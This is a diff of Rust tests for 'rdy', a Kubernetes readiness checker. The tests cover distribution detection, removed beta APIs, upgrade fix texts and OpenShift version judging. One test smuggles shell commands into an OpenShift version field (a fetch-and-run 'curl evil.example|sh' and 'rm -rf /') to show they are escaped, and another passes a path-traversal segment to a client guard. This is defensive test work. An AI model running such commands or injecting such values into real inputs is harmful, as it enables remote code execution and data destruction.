@@ -9,7 +9,10 @@ use rdy_spec::check::{ApiRef, K8sVersion};
 use serde_json::{Value, json};
 
 use super::server::{Distro, NodeFacts, Reported, cloud, compare, detect, parse_openshift};
-use super::{Gathered, Read, Served, apis, fix, judge, listed, read, shown};
+use super::{
+    Gathered, Openshift, Read, Served, apis, fix, judge, listed, read, read_discovery, shown,
+};
+use crate::client::{KubeError, from_kube_error};
 
 fn parsed(text: &str) -> Reported {
     Reported::parse(text).unwrap_or_else(|| panic!("{text} parses"))
@@ -21,6 +24,11 @@ fn api(text: &str) -> ApiRef {
 
 fn params(spec: Value) -> K8sVersion {
     serde_json::from_value(spec).expect("parameters")
+}
+
+/// What `Cluster::map_error` does by default: no plugin, no proxy variable, no CA setting.
+fn plain(error: &kube::Error) -> KubeError {
+    from_kube_error(error, "the API server", None, false, false)
 }
 
 fn node(value: Value) -> NodeFacts {
@@ -126,9 +134,49 @@ fn suffixes_name_the_distribution() {
         ("v1.29.4+rke2r1", Distro::Rke2),
         ("v1.29.4", Distro::Vanilla),
         ("v1.30.0-alpha.1", Distro::Vanilla),
+        ("v1.29.4-eks-c417bb3", Distro::Eks),
     ] {
         assert_eq!(detect(&parsed(text), false, &[]), expected, "{text}");
     }
+}
+
+#[test]
+fn eks_needs_a_hash_after_the_suffix() {
+    // The distribution for machines you run yourself writes the version in the suffix. It is not Amazon
+    // EKS, so it gets no `aws eks` command.
+    for text in [
+        "v1.29.5-eks-1-29-5",
+        "v1.29.5-eks-",
+        "v1.29.5-eks-xyz",
+        "v1.29.5-eks-abc",
+        "v1.29.5-eks-abcdef-1",
+    ] {
+        assert_eq!(
+            detect(&parsed(text), false, &[]),
+            Distro::Vanilla,
+            "{text}"
+        );
+    }
+}
+
+#[test]
+fn gke_needs_a_google_cloud_node_when_the_nodes_are_known() {
+    let server = parsed("v1.29.4-gke.1000");
+    let google = NodeFacts {
+        cloud: Some("gcp"),
+        ..bare()
+    };
+    let pool = NodeFacts {
+        gke_label: true,
+        ..bare()
+    };
+    let vmware = NodeFacts::default();
+    assert_eq!(detect(&server, false, &[google]), Distro::Gke);
+    assert_eq!(detect(&server, false, &[pool]), Distro::Gke);
+    // GKE on VMware or bare metal: the suffix is Google's, the machines are not.
+    assert_eq!(detect(&server, false, &[vmware]), Distro::Vanilla);
+    // No node list: the suffix is all there is.
+    assert_eq!(detect(&server, false, &[]), Distro::Gke);
 }
 
 #[test]
@@ -235,6 +283,41 @@ fn a_removed_beta_names_the_minor_and_the_replacement() {
             "autoscaling/v2",
         ),
         ("policy/v1beta1 PodDisruptionBudget", 25, 25, "policy/v1"),
+        (
+            "authentication.k8s.io/v1beta1 TokenReview",
+            29,
+            22,
+            "authentication.k8s.io/v1",
+        ),
+        (
+            "authorization.k8s.io/v1beta1 SubjectAccessReview",
+            29,
+            22,
+            "authorization.k8s.io/v1",
+        ),
+        (
+            "authorization.k8s.io/v1beta1 SelfSubjectRulesReview",
+            29,
+            22,
+            "authorization.k8s.io/v1",
+        ),
+        ("extensions/v1beta1 Deployment", 29, 16, "apps/v1"),
+        ("extensions/v1beta1 DaemonSet", 29, 16, "apps/v1"),
+        ("extensions/v1beta1 ReplicaSet", 29, 16, "apps/v1"),
+        (
+            "extensions/v1beta1 NetworkPolicy",
+            29,
+            16,
+            "networking.k8s.io/v1",
+        ),
+        (
+            "extensions/v1beta1 Ingress",
+            29,
+            22,
+            "networking.k8s.io/v1",
+        ),
+        ("apps/v1beta1 Deployment", 29, 16, "apps/v1"),
+        ("apps/v1beta2 StatefulSet", 29, 16, "apps/v1"),
         ("batch/v1beta1 CronJob", 30, 25, "batch/v1"),
         (
             "flowcontrol.apiserver.k8s.io/v1beta3 FlowSchema",
@@ -284,6 +367,40 @@ fn a_removed_beta_names_the_minor_and_the_replacement() {
 }
 
 #[test]
+fn a_removed_pod_security_policy_has_no_replacement_api() {
+    for (reference, removed) in [
+        ("policy/v1beta1 PodSecurityPolicy", 25),
+        ("extensions/v1beta1 PodSecurityPolicy", 16),
+    ] {
+        let text = apis::why_missing(&api(reference), Some(29));
+        assert!(
+            text.contains(&format!("was removed in Kubernetes 1.{removed}")),
+            "{text}"
+        );
+        assert!(text.contains("no replacement API"), "{text}");
+        assert!(text.contains("Pod Security Admission"), "{text}");
+        assert!(!text.contains("policy/v1\""), "no policy/v1 advice: {text}");
+        assert!(text.contains("the product or its spec"), "{text}");
+    }
+    // The other kinds of the group version keep their replacement.
+    let text = apis::why_missing(&api("policy/v1beta1 PodDisruptionBudget"), Some(29));
+    assert!(text.contains("uses \"policy/v1\""), "{text}");
+}
+
+#[test]
+fn the_flow_control_beta_names_the_version_that_exists_on_the_server() {
+    // v1 only exists from 1.29, so a 1.26 to 1.28 server needs v1beta3.
+    let text = apis::why_missing(&api("flowcontrol.apiserver.k8s.io/v1beta1 FlowSchema"), Some(27));
+    assert!(text.contains("was removed in Kubernetes 1.26"), "{text}");
+    assert!(
+        text.contains(
+            "uses \"flowcontrol.apiserver.k8s.io/v1beta3\", or \"flowcontrol.apiserver.k8s.io/v1\" from Kubernetes 1.29"
+        ),
+        "{text}"
+    );
+}
+
+#[test]
 fn a_beta_that_is_not_yet_removed_gets_the_general_text() {
     // 1.25 still serves autoscaling/v2beta2, so a missing one is not "removed".
     let text = apis::why_missing(
@@ -325,19 +442,19 @@ fn every_distribution_has_its_own_upgrade_command() {
     for (distro, command) in [
         (
             Distro::Eks,
-            "aws eks update-cluster-version --name <cluster> --kubernetes-version 1.27",
+            "aws eks update-cluster-version --region <region> --name <cluster> --kubernetes-version 1.27",
         ),
         (
             Distro::Gke,
-            "gcloud container clusters upgrade <cluster> --master --cluster-version 1.29",
+            "gcloud container clusters upgrade <cluster> --master --location=<location> --cluster-version <the 1.27 version>",
         ),
         (
             Distro::Aks,
             "az aks upgrade -g <resource-group> -n <cluster> --kubernetes-version 1.27",
         ),
         (Distro::OpenShift, "oc adm upgrade"),
-        (Distro::K3s, "INSTALL_K3S_CHANNEL=v1.29"),
-        (Distro::Rke2, "INSTALL_RKE2_CHANNEL=v1.29"),
+        (Distro::K3s, "INSTALL_K3S_CHANNEL=v1.27"),
+        (Distro::Rke2, "INSTALL_RKE2_CHANNEL=v1.27"),
         (
             Distro::Kind,
             "kind create cluster --image kindest/node:<tag for 1.29>",
@@ -354,6 +471,71 @@ fn every_distribution_has_its_own_upgrade_command() {
     }
     let eks = fix::below_min(Distro::Eks, &have, &need);
     assert!(eks.contains("then repeat for 1.28, then 1.29"), "{eks}");
+    // GKE moves one minor at a time too, and says where the cluster is.
+    let gke = fix::below_min(Distro::Gke, &have, &need);
+    assert!(gke.contains("one minor at a time"), "{gke}");
+    assert!(
+        gke.contains("`gcloud container get-server-config --location=<location>`"),
+        "{gke}"
+    );
+    assert!(gke.contains("then repeat for 1.28, then 1.29"), "{gke}");
+    assert!(
+        !gke.contains("--cluster-version 1.29"),
+        "never the far version: {gke}"
+    );
+}
+
+#[test]
+fn k3s_and_rke2_name_a_minor_channel_the_install_pipe_and_the_original_settings() {
+    let have = parsed("v1.26.9+k3s1");
+    for (distro, pipe, channel, pin, release) in [
+        (
+            Distro::K3s,
+            "`curl -sfL https://get.k3s.io | sh -`",
+            "INSTALL_K3S_CHANNEL",
+            "INSTALL_K3S_VERSION",
+            "+k3s1",
+        ),
+        (
+            Distro::Rke2,
+            "`curl -sfL https://get.rke2.io | sh -`",
+            "INSTALL_RKE2_CHANNEL",
+            "INSTALL_RKE2_VERSION",
+            "+rke2r1",
+        ),
+    ] {
+        // A bound with a patch: the channel is still a minor, and the patch has its own variable.
+        let text = fix::below_min(distro, &have, &[1, 28, 3]);
+        assert!(text.contains(pipe), "{text}");
+        assert!(text.contains(&format!("`{channel}=v1.27`")), "{text}");
+        assert!(text.contains("then repeat for 1.28"), "{text}");
+        assert!(!text.contains(&format!("{channel}=v1.28.3")), "{text}");
+        assert!(
+            text.contains(&format!("`{pin}=v1.28.3{release}`")),
+            "{text}"
+        );
+        assert!(text.contains("one minor at a time"), "{text}");
+        assert!(
+            text.contains("Repeat your original environment and arguments"),
+            "{text}"
+        );
+        // A bound without a patch has no pin.
+        let text = fix::below_min(distro, &have, &[1, 28]);
+        assert!(!text.contains(pin), "{text}");
+    }
+    let rke2 = fix::below_min(Distro::Rke2, &parsed("v1.26.9+rke2r1"), &[1, 28]);
+    assert!(rke2.contains("`systemctl restart rke2-server`"), "{rke2}");
+}
+
+#[test]
+fn openshift_fix_text_covers_managed_services_and_one_minor_at_a_time() {
+    let direct = fix::below_openshift_min("4.12.5", &[4, 15]);
+    let via_min = fix::below_min(Distro::OpenShift, &parsed("v1.25.4"), &[1, 28]);
+    for text in [direct, via_min] {
+        assert!(text.contains("ROSA, ARO, OpenShift Dedicated"), "{text}");
+        assert!(text.contains("repeat for each minor"), "{text}");
+        assert!(text.contains("`oc adm upgrade"), "{text}");
+    }
 }
 
 #[test]
@@ -383,6 +565,9 @@ fn the_other_fix_texts_name_the_bound() {
         "{ocp}"
     );
     assert!(ocp.contains("oc adm upgrade channel stable-4.14"), "{ocp}");
+    let skew = fix::skew();
+    assert!(skew.contains("two for a kubelet older than 1.25"), "{skew}");
+    assert!(skew.contains("several API servers"), "{skew}");
     let over = fix::above_max(&parsed("v1.32.1"), &[1, 31]);
     assert!(
         over.contains("Cluster is 1.32.1, newer than the 1.31"),
@@ -403,29 +588,63 @@ fn api_error(code: u16, reason: &str) -> kube::Error {
 #[test]
 fn the_server_refusing_this_identity_is_an_answer_and_other_failures_fail_the_check() {
     assert_eq!(
-        read(Err::<(), _>(api_error(403, "Forbidden")), |()| 1),
+        read(&plain, Err::<(), _>(api_error(403, "Forbidden")), |()| 1),
         Ok(Read::Forbidden)
     );
     assert_eq!(
-        read(Err::<(), _>(api_error(404, "NotFound")), |()| 1),
+        read(&plain, Err::<(), _>(api_error(404, "NotFound")), |()| 1),
         Ok(Read::Missing)
     );
     assert_eq!(
-        read(Err::<(), _>(api_error(500, "InternalError")), |()| 1),
+        read(
+            &plain,
+            Err::<(), _>(api_error(500, "InternalError")),
+            |()| 1
+        ),
         Ok(Read::Unreadable(500))
     );
-    assert_eq!(read(Ok::<_, kube::Error>(2), |n| n * 2), Ok(Read::Ok(4)));
+    assert_eq!(
+        read(&plain, Ok::<_, kube::Error>(2), |n| n * 2),
+        Ok(Read::Ok(4))
+    );
 
     // A 401 is not an answer: the credentials stopped working, and the hint says so.
-    let Err(CheckError::Failed { message, hint }) =
-        read(Err::<(), _>(api_error(401, "Unauthorized")), |()| 1)
-    else {
+    let Err(CheckError::Failed { message, hint }) = read(
+        &plain,
+        Err::<(), _>(api_error(401, "Unauthorized")),
+        |()| 1,
+    ) else {
         panic!("a 401 fails the check");
     };
     assert!(hint.contains("Log in again"), "{hint}");
     assert!(
         !message.contains("acme secret text"),
         "the server's text is not copied: {message}"
+    );
+}
+
+#[test]
+fn a_failure_hint_keeps_what_the_connection_knows() {
+    // `Cluster::map_error` gives the check the proxy note, the CA hint and the plugin name of the
+    // connection. The check uses the mapper it is given, not its own.
+    let timeout = || {
+        kube::Error::Service(Box::new(std::io::Error::new(
+            std::io::ErrorKind::TimedOut,
+            "timed out",
+        )))
+    };
+    let with_proxy = |error: &kube::Error| {
+        from_kube_error(error, "https://acme.example:6443", None, true, false)
+    };
+    let hint_of = |result: Result<Read<()>, CheckError>| match result {
+        Err(CheckError::Failed { hint, .. }) => hint,
+        other => panic!("a timeout fails the check: {other:?}"),
+    };
+    let bare = hint_of(read(&plain, Err::<(), _>(timeout()), |()| ()));
+    let noted = hint_of(read(&with_proxy, Err::<(), _>(timeout()), |()| ()));
+    assert!(
+        noted.starts_with(&bare) && noted.len() > bare.len(),
+        "the proxy note is kept: {noted}"
     );
 }
 
@@ -438,12 +657,18 @@ async fn a_guard_refusal_of_the_path_shape_means_not_served_and_any_other_refusa
     let client = harness.client_for("k8s.version");
     // The core group has one version; any other is refused as a path shape before it is sent.
     let shape = client.core_resources("v2").await;
-    assert_eq!(read(shape, |_| 1), Ok(Read::Missing));
+    assert_eq!(read_discovery(&plain, shape, |_| 1), Ok(Read::Missing));
     let shape = client.group_resources("autoscaling", "v1/../x").await;
-    assert_eq!(read(shape, |_| 1), Ok(Read::Missing));
+    assert_eq!(read_discovery(&plain, shape, |_| 1), Ok(Read::Missing));
+    // The same refusal on any other route is a bug of rdy and fails the check.
+    let shape = client.core_resources("v2").await;
+    assert!(matches!(
+        read(&plain, shape, |_| 1),
+        Err(CheckError::Failed { .. })
+    ));
     // Any other refusal is a bug of rdy, and the hint says to report it.
     let secrets = client.all::<Secret>().list(&ListParams::default()).await;
-    let Err(CheckError::Failed { hint, .. }) = read(secrets, |_| 1) else {
+    let Err(CheckError::Failed { hint, .. }) = read_discovery(&plain, secrets, |_| 1) else {
         panic!("any other refusal fails the check");
     };
     assert!(hint.contains("Report it"), "{hint}");
@@ -457,6 +682,7 @@ fn gathered(git: &str) -> Gathered {
         reported: git.to_owned(),
         server: Reported::parse(git),
         groups: Read::Ok(Vec::new()),
+        openshift: Openshift::No,
         cluster_version: None,
         nodes: Read::Ok((Vec::new(), false)),
         apis: Vec::new(),
@@ -635,11 +861,15 @@ fn every_fix_text_names_only_commands_on_the_allow_list() {
         Distro::Vanilla,
     ] {
         texts.push(fix::below_min(distro, &parsed("v1.26.9"), &[1, 29]));
+        // A bound with a patch, which k3s and RKE2 pin with their own variable.
+        texts.push(fix::below_min(distro, &parsed("v1.26.9"), &[1, 28, 3]));
     }
     for reference in [
         "autoscaling/v2beta2 HorizontalPodAutoscaler",
         "cert-manager.io/v1 Certificate",
         "v1 Pod",
+        "policy/v1beta1 PodSecurityPolicy",
+        "flowcontrol.apiserver.k8s.io/v1beta1 FlowSchema",
     ] {
         texts.push(apis::why_missing(&api(reference), Some(29)));
     }
@@ -649,4 +879,255 @@ fn every_fix_text_names_only_commands_on_the_allow_list() {
         }
         assert!(!text.contains('\u{2014}'), "no em dash: {text}");
     }
+}
+
+// ---- more judging ---------------------------------------------------------------------------------------------
+
+fn cluster_version(value: Value) -> super::openshift::ClusterVersion {
+    serde_json::from_value(value).expect("a cluster version")
+}
+
+fn on_openshift(git: &str, version: Value) -> Gathered {
+    let mut facts = gathered(git);
+    facts.openshift = Openshift::Yes;
+    facts.groups = Read::Ok(vec![("config.openshift.io".to_owned(), vec!["v1".to_owned()])]);
+    facts.cluster_version = Some(Read::Ok(cluster_version(version)));
+    facts
+}
+
+/// The text of each backtick span of `text`, in order.
+fn spans(text: &str) -> Vec<&str> {
+    text.split('`').skip(1).step_by(2).collect()
+}
+
+#[test]
+fn a_hostile_openshift_version_cannot_add_a_command_span() {
+    let hostile = "4.12.0-x`curl evil.example|sh`";
+    let facts = on_openshift(
+        "v1.25.4+3f8e0c1",
+        json!({"status": {"desired": {"version": hostile}}}),
+    );
+    let finding = judge(&params(json!({"openshift_min": "4.14"})), &facts);
+    assert_eq!(finding.level, Level::Fail);
+    // The sentence holds the version as text, with no backtick in it.
+    assert!(!finding.message.contains('`'), "{}", finding.message);
+    assert!(finding.message.contains("4.12.0-x'curl evil.example|sh'"));
+    // The fix text holds the parsed numbers, and exactly the spans of the template.
+    let fix = finding.fix.expect("a fix");
+    if let Err(error) = rdy_engine::fixtext::check(&fix) {
+        panic!("{error}: {fix}");
+    }
+    assert_eq!(
+        spans(&fix),
+        [
+            "oc adm upgrade",
+            "oc adm upgrade channel stable-4.14",
+            "oc adm upgrade --to-latest"
+        ],
+        "{fix}"
+    );
+    assert!(fix.contains("OpenShift is 4.12.0, product needs 4.14"), "{fix}");
+    assert!(!fix.contains("evil"), "{fix}");
+
+    // A version rdy cannot read is quoted in the partial note without a backtick too.
+    let facts = on_openshift(
+        "v1.25.4+3f8e0c1",
+        json!({"status": {"desired": {"version": "four`rm -rf /`"}}}),
+    );
+    let finding = judge(&params(json!({"openshift_min": "4.14"})), &facts);
+    let partial = finding.partial.expect("partial");
+    assert!(!partial.note.contains('`'), "{}", partial.note);
+    assert!(partial.note.contains("which rdy cannot read"));
+}
+
+#[test]
+fn shown_replaces_backticks() {
+    assert_eq!(shown("a`b`"), "a'b'");
+}
+
+#[test]
+fn an_openshift_update_is_judged_on_the_last_completed_version() {
+    let updating = json!({"status": {
+        "desired": {"version": "4.15.2"},
+        "history": [
+            {"state": "Partial", "version": "4.15.2"},
+            {"state": "Completed", "version": "4.14.9"}
+        ]
+    }});
+    let facts = on_openshift("v1.28.5+abc", updating.clone());
+    // The cluster still runs 4.14.9, so a 4.15 minimum is not met yet.
+    let finding = judge(&params(json!({"openshift_min": "4.15"})), &facts);
+    assert_eq!(finding.level, Level::Fail);
+    assert_eq!(
+        finding.message,
+        "OpenShift 4.14.9 is older than the 4.15 minimum (Kubernetes v1.28.5+abc)"
+    );
+    assert!(
+        finding
+            .notes
+            .iter()
+            .any(|n| n.contains("from 4.14.9 to 4.15.2") && n.contains("last completed")),
+        "{:?}",
+        finding.notes
+    );
+    // A minimum that the completed version meets passes, and keeps the note.
+    let finding = judge(&params(json!({"openshift_min": "4.14"})), &facts);
+    assert_eq!(finding.level, Level::Pass);
+    assert_eq!(finding.observed["openshift_version"], "4.14.9");
+    assert_eq!(finding.notes.len(), 1);
+    // No completed entry: the version it moves to, and the note says so.
+    let first = on_openshift(
+        "v1.28.5+abc",
+        json!({"status": {"desired": {"version": "4.15.2"}, "history": [{"state": "Partial", "version": "4.15.2"}]}}),
+    );
+    let finding = judge(&params(json!({"openshift_min": "4.15"})), &first);
+    assert_eq!(finding.level, Level::Pass);
+    assert!(
+        finding.notes[0].contains("no completed version is recorded"),
+        "{:?}",
+        finding.notes
+    );
+    // Finished: the plain desired version, no note.
+    let done = on_openshift(
+        "v1.28.5+abc",
+        json!({"status": {"desired": {"version": "4.15.2"}, "history": [{"state": "Completed", "version": "4.15.2"}, {"state": "Completed", "version": "4.14.9"}]}}),
+    );
+    let finding = judge(&params(json!({"openshift_min": "4.15"})), &done);
+    assert_eq!(finding.level, Level::Pass);
+    assert!(finding.notes.is_empty());
+}
+
+#[test]
+fn a_cluster_version_keeps_the_newest_completed_entry() {
+    let value = cluster_version(json!({"status": {
+        "desired": {"version": "4.15.2"},
+        "history": [
+            {"state": "Partial", "version": "4.15.2"},
+            {"state": "Completed", "version": "4.14.9"},
+            {"state": "Completed", "version": "4.13.1"}
+        ]
+    }}));
+    assert!(value.updating());
+    assert_eq!(value.updating_from(), Some("4.14.9"));
+    assert_eq!(value.version(), Some("4.14.9"));
+    assert_eq!(value.target(), Some("4.15.2"));
+    let idle = cluster_version(json!({"status": {
+        "desired": {"version": "4.14.9"},
+        "history": [{"state": "Completed", "version": "4.14.9"}]
+    }}));
+    assert_eq!(idle.updating_from(), None);
+    assert_eq!(idle.version(), Some("4.14.9"));
+}
+
+#[test]
+fn a_bound_with_a_patch_is_unverified_when_the_server_patch_is_unknown() {
+    // `/version` gave only major and minor (the git version was not readable).
+    let mut facts = gathered("not a version");
+    facts.server = Reported::from_major_minor("1", "28+");
+    let pass = judge(&params(json!({"min": "1.28"})), &facts);
+    assert_eq!(pass.level, Level::Pass);
+    assert!(pass.partial.is_none());
+    let unknown = judge(&params(json!({"min": "1.28.3"})), &facts);
+    assert_eq!(unknown.level, Level::Pass);
+    let partial = unknown.partial.expect("partial");
+    assert!(
+        partial.note.contains("min 1.28.3 was not checked to the patch")
+            && partial.note.contains("only 1.28"),
+        "{}",
+        partial.note
+    );
+    // A lower minor still blocks, patch or not.
+    let below = judge(&params(json!({"min": "1.29.1"})), &facts);
+    assert_eq!(below.level, Level::Fail);
+    // With the patch known, the bound is judged on it.
+    let known = judge(&params(json!({"min": "1.28.3"})), &gathered("v1.28.1"));
+    assert_eq!(known.level, Level::Fail);
+}
+
+#[test]
+fn a_kubelet_older_than_1_25_may_be_only_two_minors_behind() {
+    let nodes = |kubelet: &str| {
+        Read::Ok((
+            vec![NodeFacts {
+                name: "n".to_owned(),
+                kubelet: Reported::parse(kubelet),
+                ..bare()
+            }],
+            false,
+        ))
+    };
+    let spec = params(json!({"min": "1.20"}));
+    // Three behind: allowed for 1.25 and later, too far for 1.24 and earlier.
+    let mut facts = gathered("v1.28.1");
+    facts.nodes = nodes("v1.25.0");
+    assert_eq!(judge(&spec, &facts).level, Level::Pass);
+    facts.nodes = nodes("v1.24.9");
+    let finding = judge(&spec, &facts);
+    assert_eq!(finding.level, Level::Warn);
+    assert_eq!(
+        finding.message,
+        "1 kubelet is too far behind the API server: n (1.24.9)"
+    );
+    // Two behind is fine for any of them.
+    let mut facts = gathered("v1.26.1");
+    facts.nodes = nodes("v1.24.9");
+    assert_eq!(judge(&spec, &facts).level, Level::Pass);
+}
+
+#[test]
+fn when_the_group_list_and_the_cluster_version_are_both_unreadable_min_is_not_applied() {
+    let mut facts = gathered("v1.27.8+3f8e0c1");
+    facts.groups = Read::Forbidden;
+    facts.openshift = Openshift::Unknown;
+    facts.cluster_version = Some(Read::Forbidden);
+    let finding = judge(
+        &params(json!({"min": "1.28", "openshift_min": "4.14"})),
+        &facts,
+    );
+    // Nothing was measured as failing: the Kubernetes minimum is not applied to an unknown cluster.
+    assert_eq!(finding.level, Level::Pass);
+    let partial = finding.partial.expect("partial");
+    assert!(
+        partial.note.contains("openshift_min was not checked")
+            && partial.note.contains("cannot tell whether this is OpenShift"),
+        "{}",
+        partial.note
+    );
+    assert_eq!(
+        partial.missing_grants,
+        ["get clusterversions.config.openshift.io/version"]
+    );
+    assert!(
+        finding.notes.iter().any(|n| n.contains("could not tell whether")),
+        "{:?}",
+        finding.notes
+    );
+}
+
+#[test]
+fn an_unreadable_version_still_blocks_on_a_missing_api() {
+    let mut facts = gathered("acme-build-7");
+    facts.server = None;
+    facts.apis = vec![
+        (api("autoscaling/v2beta2 HorizontalPodAutoscaler"), Served::No),
+        (api("v1 Pod"), Served::Yes),
+    ];
+    let spec = params(json!({"min": "1.28", "apis": ["autoscaling/v2beta2 HorizontalPodAutoscaler", "v1 Pod"]}));
+    let finding = judge(&spec, &facts);
+    assert_eq!(finding.level, Level::Fail);
+    assert_eq!(
+        finding.message,
+        "autoscaling/v2beta2 HorizontalPodAutoscaler is not served"
+    );
+    assert!(finding.notes[0].contains("acme-build-7"), "{:?}", finding.notes);
+    assert!(finding.partial.is_some());
+    assert_eq!(
+        finding.observed["apis"][0],
+        json!({"api": "autoscaling/v2beta2 HorizontalPodAutoscaler", "served": false})
+    );
+    // The version fix is still there after the API fix.
+    assert!(finding.fix.expect("fix").contains("kubectl version"));
+    // With every API served the result stays the partial warning.
+    facts.apis = vec![(api("v1 Pod"), Served::Yes)];
+    assert_eq!(judge(&spec, &facts).level, Level::Warn);
 }
